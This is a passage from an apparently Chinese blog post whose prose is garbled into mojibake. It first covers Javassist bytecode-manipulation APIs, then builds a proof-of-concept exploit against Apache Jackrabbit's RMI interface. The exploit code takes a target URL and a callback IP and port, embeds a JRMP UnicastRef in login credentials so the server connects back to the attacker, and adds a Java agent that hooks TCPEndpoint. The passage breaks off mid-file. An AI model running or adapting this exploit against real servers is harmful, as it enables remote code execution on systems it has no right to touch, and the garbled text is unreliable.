ä¸€è‡´</span><br>ClassPool pool1 = <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ClassPool</span>.</span></span>get<span class="hljs-constructor">Default()</span>;<br></code></pre></td></tr></table></figure><p>ä¸ºå‡å°‘ClassPoolå¯èƒ½å¯¼è‡´çš„å†…å­˜æ¶ˆè€—. å¯ä»¥ä»ClassPoolä¸­åˆ é™¤ä¸å¿…è¦çš„CtClasså¯¹è±¡. æˆ–è€…æ¯æ¬¡åˆ›å»ºæ–°çš„ClassPoolå¯¹è±¡.</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-comment">// ä»ClassPoolä¸­åˆ é™¤CtClasså¯¹è±¡</span><br>ctClass.detach();<br><span class="hljs-comment">// ä¹Ÿå¯ä»¥æ¯æ¬¡åˆ›å»ºä¸€ä¸ªæ–°çš„ClassPool, è€Œä¸æ˜¯ClassPool.getDefault(), é¿å…å†…å­˜æº¢å‡º</span><br>ClassPool pool2 = <span class="hljs-keyword">new</span> <span class="hljs-type">ClassPool</span>(<span class="hljs-literal">true</span>);<br></code></pre></td></tr></table></figure><h3 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h3><ul><li>freeze: å†»ç»“ä¸€ä¸ªç±»ï¼Œä½¿å…¶ä¸å¯ä¿®æ”¹ï¼›</li><li>isFrozen : åˆ¤æ–­ä¸€ä¸ªç±»æ˜¯å¦å·²è¢«å†»ç»“ï¼›</li><li>prune : åˆ é™¤ç±»ä¸å¿…è¦çš„å±æ€§ï¼Œä»¥å‡å°‘å†…å­˜å ç”¨ã€‚è°ƒç”¨è¯¥æ–¹æ³•åï¼Œè®¸å¤šæ–¹æ³•æ— æ³•å°†æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œæ…ç”¨ï¼›</li><li>defrost : è§£å†»ä¸€ä¸ªç±»ï¼Œä½¿å…¶å¯ä»¥è¢«ä¿®æ”¹ã€‚å¦‚æœäº‹å…ˆçŸ¥é“ä¸€ä¸ªç±»ä¼šè¢«defrostï¼Œ åˆ™ç¦æ­¢è°ƒç”¨ prune æ–¹æ³•ï¼›</li><li>detach : å°†è¯¥classä»ClassPoolä¸­åˆ é™¤ï¼›</li><li>writeFile : æ ¹æ®CtClassç”Ÿæˆ .class æ–‡ä»¶ï¼›</li><li>toClass : é€šè¿‡ç±»åŠ è½½å™¨åŠ è½½è¯¥CtClassã€‚</li><li>setInterfaces: æ·»åŠ çˆ¶æ¥å£</li><li>setSuperclass: æ·»åŠ çˆ¶ç±»</li></ul><p>å…¶ä»–è¯¦ç»†ç”¨æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// é€šè¿‡ç±»åè·å– CtClass, æœªæ‰¾åˆ°ä¼šæŠ›å‡ºå¼‚å¸¸</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.kawa.ssist.JustRun&quot;</span>);<br><span class="hljs-comment">// é€šè¿‡ç±»åè·å– CtClass, æœªæ‰¾åˆ°è¿”å› null, ä¸ä¼šæŠ›å‡ºå¼‚å¸¸</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass1</span> <span class="hljs-operator">=</span> pool.getOrNull(<span class="hljs-string">&quot;com.kawa.ssist.JustRun&quot;</span>);<br><span class="hljs-comment">// å¤åˆ¶ä¸€ä¸ªç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass2</span> <span class="hljs-operator">=</span> pool.getAndRename(<span class="hljs-string">&quot;com.kawa.ssist.JustRun&quot;</span>, <span class="hljs-string">&quot;com.kawa.ssist.JustRunq&quot;</span>);<br><span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªæ–°ç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass3</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;com.kawa.ssist.JustRuna&quot;</span>);<br><span class="hljs-comment">// é€šè¿‡classæ–‡ä»¶åˆ›å»ºä¸€ä¸ªæ–°ç±»</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass4</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/home/un/test/JustRun.class&quot;</span>)));<br><span class="hljs-comment">// æ·»åŠ æ¥å£</span><br>ctClass.addInterface(...);<br><span class="hljs-comment">// æ·»åŠ æ„é€ å™¨</span><br>ctClass.addConstructor(...);<br><span class="hljs-comment">// æ·»åŠ å­—æ®µ</span><br>ctClass.addField(...);<br><span class="hljs-comment">// æ·»åŠ æ–¹æ³•</span><br>ctClass.addMethod(...);<br><span class="hljs-comment">// è·å–å­—èŠ‚ç æ–‡ä»¶ éœ€è¦æ³¨æ„çš„æ˜¯ä¸€æ—¦è°ƒç”¨è¯¥æ–¹æ³•ï¼Œåˆ™æ— æ³•ç»§ç»­ä¿®æ”¹å·²ç»è¢«åŠ è½½çš„class</span><br><span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> ctClass.toClass();<br><span class="hljs-comment">// ç±»çš„å­—èŠ‚ç æ–‡ä»¶</span><br><span class="hljs-type">ClassFile</span> <span class="hljs-variable">classFile</span> <span class="hljs-operator">=</span> ctClass.getClassFile();<br><span class="hljs-comment">// ç¼–è¯‘æˆå­—èŠ‚ç æ–‡ä»¶, ä½¿ç”¨å½“å‰çº¿ç¨‹ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨åŠ è½½ç±», å¦‚æœç±»å·²å­˜åœ¨æˆ–è€…ç¼–è¯‘å¤±è´¥å°†æŠ›å‡ºå¼‚å¸¸</span><br><span class="hljs-type">byte</span>[] bytes = ctClass.toBytecode();<br></code></pre></td></tr></table></figure><h3 id="CtMethods-CtConstructor"><a href="#CtMethods-CtConstructor" class="headerlink" title="CtMethods&#x2F;CtConstructor"></a>CtMethods&#x2F;CtConstructor</h3><ul><li>insertBefore : åœ¨æ–¹æ³•çš„èµ·å§‹ä½ç½®æ’å…¥ä»£ç ï¼›</li><li>insterAfter : åœ¨æ–¹æ³•çš„æ‰€æœ‰ return è¯­å¥å‰æ’å…¥ä»£ç ä»¥ç¡®ä¿è¯­å¥èƒ½å¤Ÿè¢«æ‰§è¡Œï¼Œé™¤éé‡åˆ°exceptionï¼›</li><li>insertAt : åœ¨æŒ‡å®šçš„ä½ç½®æ’å…¥ä»£ç ï¼›</li><li>setBody: å°†æ–¹æ³•çš„å†…å®¹è®¾ç½®ä¸ºè¦å†™å…¥çš„ä»£ç ï¼Œå½“æ–¹æ³•è¢« abstractä¿®é¥°æ—¶ï¼Œè¯¥ä¿®é¥°ç¬¦è¢«ç§»é™¤ï¼›</li><li>make : åˆ›å»ºä¸€ä¸ªæ–°çš„æ–¹æ³•ã€‚</li></ul><p>å…¶ä»–è¯¦ç»†ç”¨æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//**è·å–CtMethodå±æ€§*/</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass5</span> <span class="hljs-operator">=</span> pool.get(TestService.class.getName());<br><span class="hljs-type">CtMethod</span> <span class="hljs-variable">ctMethod</span> <span class="hljs-operator">=</span> ctClass5.getDeclaredMethod(<span class="hljs-string">&quot;selectOrder&quot;</span>);<br><span class="hljs-comment">// æ–¹æ³•å</span><br><span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> ctMethod.getName();<br><span class="hljs-comment">// è¿”å›ç±»å‹</span><br><span class="hljs-type">CtClass</span> <span class="hljs-variable">returnType</span> <span class="hljs-operator">=</span> ctMethod.getReturnType();<br><span class="hljs-comment">// æ–¹æ³•å‚æ•°, é€šè¿‡æ­¤ç§æ–¹å¼å¾—åˆ°æ–¹æ³•å‚æ•°åˆ—è¡¨</span><br><span class="hljs-comment">// æ ¼å¼: com.kawa.TestService.getOrder(java.lang.String,java.util.List)</span><br>ctMethod.getLongName();<br><span class="hljs-comment">// æ–¹æ³•ç­¾å æ ¼å¼: (Ljava/lang/String;Ljava/util/List;Lcom/test/Order;)Ljava/lang/Integer;</span><br>ctMethod.getSignature();<br><br><span class="hljs-comment">// è·å–æ–¹æ³•å‚æ•°åç§°, å¯ä»¥é€šè¿‡è¿™ç§æ–¹å¼å¾—åˆ°æ–¹æ³•çœŸå®å‚æ•°åç§°</span><br>List&lt;String&gt; argKeys = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br><span class="hljs-type">MethodInfo</span> <span class="hljs-variable">methodInfo</span> <span class="hljs-operator">=</span> ctMethod.getMethodInfo();<br><span class="hljs-type">CodeAttribute</span> <span class="hljs-variable">codeAttribute</span> <span class="hljs-operator">=</span> methodInfo.getCodeAttribute();<br><span class="hljs-type">LocalVariableAttribute</span> <span class="hljs-variable">attr</span> <span class="hljs-operator">=</span> (LocalVariableAttribute) codeAttribute.getAttribute(LocalVariableAttribute.tag);<br><span class="hljs-type">int</span> <span class="hljs-variable">len</span> <span class="hljs-operator">=</span> ctMethod.getParameterTypes().length;<br><span class="hljs-comment">// éé™æ€çš„æˆå‘˜å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯this</span><br><span class="hljs-type">int</span> <span class="hljs-variable">pos</span> <span class="hljs-operator">=</span> Modifier.isStatic(ctMethod.getModifiers()) ? <span class="hljs-number">0</span> : <span class="hljs-number">1</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> pos; i &lt; len; i++) &#123;<br>    argKeys.add(attr.variableName(i));<br>&#125;<br><br><br><span class="hljs-comment">//*CtMethodæ–¹æ³•ä½“ä¿®æ”¹*//</span><br><span class="hljs-comment">// åœ¨æ–¹æ³•ä½“å‰æ’å…¥ä»£ç å—</span><br>ctMethod.insertBefore(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// åœ¨æ–¹æ³•ä½“åæ’å…¥ä»£ç å—</span><br>ctMethod.insertAfter(<span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// åœ¨æŸè¡Œ å­—èŠ‚ç  åæ’å…¥ä»£ç å—</span><br>ctMethod.insertAt(<span class="hljs-number">10</span>, <span class="hljs-string">&quot;&quot;</span>);<br><span class="hljs-comment">// æ·»åŠ å‚æ•°</span><br>ctMethod.addParameter(CtClass);<br><span class="hljs-comment">// è®¾ç½®æ–¹æ³•å</span><br>ctMethod.setName(<span class="hljs-string">&quot;newName&quot;</span>);<br><span class="hljs-comment">// è®¾ç½®æ–¹æ³•ä½“ $0=this / $1,$2,$3... ä»£è¡¨æ–¹æ³•å‚æ•°</span><br>ctMethod.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<br><span class="hljs-comment">//åˆ›å»ºä¸€ä¸ªæ–°çš„æ–¹æ³•</span><br>ctMethod.make(<span class="hljs-string">&quot;kawa&quot;</span>,CtClass);<br></code></pre></td></tr></table></figure><h3 id="CtFields"><a href="#CtFields" class="headerlink" title="CtFields"></a>CtFields</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æ–°å»ºä¸€ä¸ªåä¸ºAï¼Œæƒé™ä¿®é¥°ç¬¦ä¸ºpublicï¼Œç±»å‹ä¸ºStringï¼Œå€¼ä¸ºBçš„å˜é‡</span><br><span class="hljs-type">CtField</span> <span class="hljs-variable">param1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;A&quot;</span>, ctClass);<br>param1.setModifiers(Modifier.PUBLIC);<br>ctClass.addField(param1, CtField.Initializer.constant(<span class="hljs-string">&quot;B&quot;</span>));<br><br><span class="hljs-comment">//è¿™é‡Œåªç”¨åˆ°è¿™ä¸ªå°±å…ˆå†™è¿™ä¸ªå§ï¼Œè¿˜æœ‰æ ¹æ®å˜é‡åè·å–å˜é‡è¿›è¡Œä¿®æ”¹çš„å¤ªå¤šäº†å°±ä¸å†™äº†ï¼Œç½‘ä¸Šéƒ½èƒ½æ‰¾åˆ°ã€‚ã€‚åªæœ‰è¿™ä¸ªä¸å¥½æ‰¾æ‰€ä»¥å°±å†™å‡ºæ¥ã€‚</span><br></code></pre></td></tr></table></figure><h2 id="å®æ“"><a href="#å®æ“" class="headerlink" title="å®æ“"></a>å®æ“</h2><h3 id="æ€è·¯ï¼š"><a href="#æ€è·¯ï¼š" class="headerlink" title="æ€è·¯ï¼š"></a><strong>æ€è·¯ï¼š</strong></h3><ul><li>åˆ›å»ºAgentï¼ˆpremainå’Œtransformï¼‰å°†<code>sun.rmi.transport.tcp.TCPEndpoint</code>HOOK</li><li>åœ¨transformå¤„å°†HOOKçš„TCPEndpointè¿›è¡Œä¿®æ”¹ï¼ˆæˆ‘ä»¬è¿™é‡Œçš„éœ€æ±‚åªç”¨æ”¹å®ƒçš„å››å‚æ„é€ æ–¹æ³•ï¼‰</li><li>å°†ä¿®æ”¹åçš„.classæ–‡ä»¶è¿”å›ç»™transform</li><li>å°†Agentæ‰“jaråŒ…å¹¶é…ç½®resources\META-INF\MANIFEST.MF</li><li>æŠŠpocæ‰“åŒ…å¹¶æ¥æ”¶targeturlã€callbackipã€callbackportå‚æ•°</li></ul><h3 id="JRMPåŒ…ï¼š"><a href="#JRMPåŒ…ï¼š" class="headerlink" title="JRMPåŒ…ï¼š"></a>JRMPåŒ…ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> test;<br><br><span class="hljs-keyword">import</span> sun.rmi.server.UnicastRef;<br><span class="hljs-keyword">import</span> org.apache.commons.cli.*;<br><span class="hljs-keyword">import</span> org.apache.jackrabbit.rmi.repository.URLRemoteRepository;<br><span class="hljs-keyword">import</span> javax.jcr.Repository;<br><span class="hljs-keyword">import</span> javax.jcr.RepositoryException;<br><span class="hljs-keyword">import</span> javax.jcr.SimpleCredentials;<br><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JRMP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, RepositoryException &#123;<br>        <span class="hljs-type">Options</span> <span class="hljs-variable">options</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Options</span>();<br><br><br><br>        <span class="hljs-type">Option</span> <span class="hljs-variable">targetUrlOption</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Option</span>(<span class="hljs-string">&quot;tu&quot;</span>, <span class="hljs-string">&quot;targeturl&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;Target URL&quot;</span>);<br>        targetUrlOption.setRequired(<span class="hljs-literal">true</span>);<br>        options.addOption(targetUrlOption);<br><br>        <span class="hljs-type">Option</span> <span class="hljs-variable">callbackIpOption</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Option</span>(<span class="hljs-string">&quot;ci&quot;</span>, <span class="hljs-string">&quot;callbackip&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;Callback IP address&quot;</span>);<br>        callbackIpOption.setRequired(<span class="hljs-literal">true</span>);<br>        options.addOption(callbackIpOption);<br><br>        <span class="hljs-type">Option</span> <span class="hljs-variable">callbackPortOption</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Option</span>(<span class="hljs-string">&quot;cp&quot;</span>, <span class="hljs-string">&quot;callbackport&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-string">&quot;Callback port&quot;</span>);<br>        callbackPortOption.setType(Integer.class);<br>        callbackPortOption.setRequired(<span class="hljs-literal">true</span>);<br>        options.addOption(callbackPortOption);<br><br>        <span class="hljs-type">CommandLineParser</span> <span class="hljs-variable">parser</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultParser</span>();<br>        <span class="hljs-type">HelpFormatter</span> <span class="hljs-variable">formatter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelpFormatter</span>();<br><br>        CommandLine cmd;<br>        <span class="hljs-keyword">try</span> &#123;<br>            cmd = parser.parse(options, args);<br>        &#125; <span class="hljs-keyword">catch</span> (ParseException e) &#123;<br>            System.out.println(e.getMessage());<br>            formatter.printHelp(<span class="hljs-string">&quot;Apache_jackrabbit_TRUE.jar&quot;</span>, options);<br>            System.exit(<span class="hljs-number">1</span>);<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">targetUrl</span> <span class="hljs-operator">=</span> cmd.getOptionValue(<span class="hljs-string">&quot;targeturl&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">callbackip</span> <span class="hljs-operator">=</span> cmd.getOptionValue(<span class="hljs-string">&quot;callbackip&quot;</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">callbackport</span> <span class="hljs-operator">=</span> Integer.parseInt(cmd.getOptionValue(<span class="hljs-string">&quot;callbackport&quot;</span>));<br><br><br>        String host= callbackip;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> callbackport;<br>        java.rmi.server.<span class="hljs-type">ObjID</span> <span class="hljs-variable">objId</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.rmi.server.ObjID();<br>        sun.rmi.transport.tcp.<span class="hljs-type">TCPEndpoint</span> <span class="hljs-variable">endpoint</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.rmi.transport.tcp.TCPEndpoint(host, port);<br>        sun.rmi.transport.<span class="hljs-type">LiveRef</span> <span class="hljs-variable">liveRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.rmi.transport.LiveRef(objId, endpoint, <span class="hljs-literal">false</span>);<br>        <span class="hljs-type">UnicastRef</span> <span class="hljs-variable">unicastRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.rmi.server.UnicastRef(liveRef);<br><br>        <span class="hljs-type">SimpleCredentials</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleCredentials</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>.toCharArray());<br>        exp.setAttribute( <span class="hljs-string">&quot;admin111&quot;</span>,unicastRef);<br>        <span class="hljs-type">Repository</span> <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLRemoteRepository</span>(targetUrl);<span class="hljs-comment">//ç›®æ ‡åœ°å€  //10.65.14.146æœ¬åœ°    10.65.14.247è¿œç¨‹      eg:     http://10.65.14.247:8080/rmi</span><br><br>        repository.login(exp);<br><br><span class="hljs-comment">//    java -jar test.jar  --targeturl=&quot;http://10.65.14.247:8080/rmi&quot; --callbackip=&quot;10.65.14.146&quot; --callbackport=7878</span><br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>MANIFEST.MFï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">Manifest-Version: <span class="hljs-number">1.0</span><br>Main-Class: test.JRMP<br><br><br></code></pre></td></tr></table></figure><h3 id="AgentåŒ…"><a href="#AgentåŒ…" class="headerlink" title="AgentåŒ…"></a>AgentåŒ…</h3><p><strong>Mainagent.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Mainagent</span> &#123;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        <span class="hljs-comment">//Agnetæ¥æ”¶å‚æ•°</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">callbackip</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">targetip</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (agentArgs != <span class="hljs-literal">null</span> &amp;&amp; !agentArgs.isEmpty()) &#123;<br>            String[] args = agentArgs.split(<span class="hljs-string">&quot;,&quot;</span>);<br>            <span class="hljs-keyword">for</span> (String arg : args) &#123;<br>                String[] keyValue = arg.split(<span class="hljs-string">&quot;=&quot;</span>);<br>                <span class="hljs-keyword">if</span> (keyValue.length == <span class="hljs-number">2</span> &amp;&amp; keyValue[<span class="hljs-number">0</span>].trim().equals(<span class="hljs-string">&quot;callbackip&quot;</span>)) &#123;<br>                    callbackip = keyValue[<span class="hljs-number">1</span>].trim();<br>                &#125;<br>                <span class="hljs-keyword">if</span> (keyValue.length == <span class="hljs-number">2</span> &amp;&amp; keyValue[<span class="hljs-number">0</span>].trim().equals(<span class="hljs-string">&quot;targetip&quot;</span>)) &#123;<br>                    targetip = keyValue[<span class="hljs-number">1</span>].trim();<br>                &#125;<br>            &#125;<br>        &#125;<br>        System.out.println(<span class="hljs-string">&quot;agnet proxy has start&quot;</span>);<br>        inst.addTransformer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TAT</span>(targetip, callbackip), <span class="hljs-literal">true</span>);<span class="hljs-comment">//ä¼ å…¥å®ç°ClassFileTransformerçš„å¯¹è±¡ï¼Œåé¢å¿…é¡»ä¼ trueï¼Œå¦åˆ™ä¸å…è®¸ä¿®æ”¹</span><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><strong>TAT.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> Agent;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.instrument.ClassFileTransformer;<br><span class="hljs-keyword">import</span> java.lang.instrument.IllegalClassFormatException;<br><span class="hljs-keyword">import</span> java.security.ProtectionDomain;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TAT</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">Hook_class</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;sun/rmi/transport/tcp/TCPEndpoint&quot;</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">Hook_class1</span> <span class="hljs-operator">=</span> <span 